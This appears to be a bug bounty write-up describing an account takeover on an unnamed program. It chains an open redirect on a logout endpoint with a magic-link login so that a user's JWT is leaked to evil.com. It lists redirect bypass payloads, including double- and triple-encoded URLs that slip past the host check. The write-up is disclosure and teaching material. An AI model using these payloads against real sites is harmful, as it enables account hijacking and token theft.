# Account Takeover Through Open Redirect

## How:

The program had an endpoint that was open to redirection vulnerability. By combining this vulnerability with authentication functionality, I was able to take over the user's account.

## Open Redirection Vulnerability:

### Original Request

![alt text](original_redirect.png)

### Steps

- The application had an endpoint like this <span style="color:red"> ***/logout*** </span> that takes a <span style="color:red">***GET***</span> parameter called <span style="color:red">***r***</span>.
- The parameter <span style="color:red">***r***</span> takes an endpoint to be redirected to like this <span style="color:red">***/logout?r=/dashboard***</span>.
- So I tried to put a valid host to see what it does like this <span style="color:red">***logout?r=https://program.com/***</span>.
- The application redirected me, so I knew that I could play with it to see what else I could get.
- I tried to set the host name to another domain like <span style="color:red">***r=https://evil.com/***</span> and the application responded with <span style="color:red">***invalid redirect uri***</span>.
- Knowing this I thought of listing some payloads to try out:<br>
  <span style="color:red">***r=https://evil.com/program.com***</span><br>
  <span style="color:red">***r=https://program.com.evil.com***</span><br>
  <span style="color:red">***r=https://program.com@evil.com***</span><br>
  <span style="color:red">***r=https://evil.com@program.com***</span><br>
  
- The last one was the road to success from this list. However, it's still no redirection because the application will always redirect to itself.

- So at first, why did we try these payloads?
  - When I try to find an open redirection, I first try to know what url format is allowed or understandable by browsers. So, the meaning of <span style="color:red">***https://john@program.com***</span> is that you are trying to access <span style="color:red">***program.com***</span> as username <span style="color:red">***john***</span>. You can try this on firefox or chrome. 
  - So, by knowing this, I was thinking, what if the developer is using a regex that validates this format,and when someone tries to change the value of <span style="color:red">***r***</span> to <span style="color:red">***https://evil.com@program.com***</span> he validetes it as a valid value because he knows that it's the same thing. The user will be redirected to program.com at the end, too.
  - Another question comes to mind. What is the set of characters allowed before <span style="color:red">***@***</span> I tried to test it on the browser to see what is allowed. And, I have found that the browser when I put an encoded value like this <span style="color:red">***john%2f***</span> as a username, it validates it and sees it as a valid value. You can try it <span style="color:red">***john%2f@google.com***</span>.
  - I tried to set <span style="color:red">***r***</span> to <span style="color:red">***https://evil.com%252f@program.com/***</span> and sent the request. The response successfully redirected me to <span style="color:red">***https://evil.com/@program.com/***</span>
  - So, let's break the payload.
    - The application validates this <span style="color:red">***john@program.com***</span> as a valid format.
    - So I tried to inject <span style="color:red">***/***</span> in the payload but double-encoded  like this <span style="color:red">***https://evil.com%252f@program.com/***</span>.
    - It's double encoded because if I encode once, it will reach the web server decoded one time.
    - The payload reaches the code at the other end like this <span style="color:red">***https://evil.com%2f@program.com/***</span>.
    - Then the response returns the redirection like this <span style="color:red">***https://evil.com/@program.com***</span>.
    - As you can see, the browser will treat <span style="color:red">***/@program.com***</span> as a path to <span style="color:red">***https://evil.com***</span> and the redirection successfully happens to <span style="color:red">**evil.com**</span>.
- Another important thing is that the <span style="color:red">***/logout***</span> endpoint sends any get parameter with the new redirection, like this <span style="color:red">**/logout?r=https://evil.com%252f@program.com&heap=heap**</span> the redirection will be like this <span style="color:red">**https://evil.com/@program.com/?r=https://evil.com%252f@program.com&heap=heap**</span>.

### Exploited Request

![alt text](exploited_request.png)

## Exploiting The Login Functionality.

### Original Request

![alt text](magic_link_original_request.png)

### Steps

- The application has the functionality to send you a magic link to login with it. This endpoint takes span style="color:red">***email***</span> and <span style="color:red">***redirect_uri***</span> parameters. So, after trying to find a vulnerability in the email, I tried to find out what I could do with the <span style="color:red">***redirect_uri***</span>.
- The <span style="color:red">***redirect_uri***</span> takes a url, and the application appends a <span style="color:red">**JWT**</span> token to it as a GET parameter and sends it to the user.
- So, I tried to play with the hostname of this url to try and find an open redirection, but with no clue.
- But, what if I could edit the path of the url like this <span style="color:red">**https://program.com/anypath/anypath**</span> I tried it and sent the request, and when I looked at my mail, I found that the magic link is like this <span style="color:red">**https://program.com/anypath/anypath?jwt=SOME_VALUE**</span>.
- Okay great, Can I combine this with the open redirection I have found before? set the <span style="color:red">**redirect_uri**</span> to <span style="color:red">**https://program.com/logout?r=https://evil.com%2525%2532%2566@program.com**</span>.
- And the magic link sent was like this <span style="color:red">**https://program.com/logout?r=https://evil.com%252f@program.com&jwt=SOME_VALUE**</span>.
- Clicking the link, I was redirected to <span style="color:red">**https://evil.com/?https://evil.com%252f@program.com&jwt=SOME_VALUE**</span>.
- Doing this, I was able to get the JWT as an attacker, and using the JWT, I was able to login.
- So the same scenario applies if you want to target another user. You need an email, and after collecting the JWT, you can use it to login to the user's account.

### Exploited Request

![alt text](magic_link_exploited_request.png)

### My Info

#### Yeswehack  : <a href="https://yeswehack.com/hunters/mekky">https://yeswehack.com/hunters/mekky</a>

#### Intigriti  : <a href="https://app.intigriti.com/researcher/profile/mekky">https://app.intigriti.com/researcher/profile/mekky</a>

#### Linkedin   : <a href="https://www.linkedin.com/in/muhammed-mekkawy-1504821b2/">https://www.linkedin.com/in/muhammed-mekkawy-1504821b2/</a>

#### Twitter    : <a href="https://twitter.com/Mekky49295157">https://twitter.com/Mekky49295157</a>


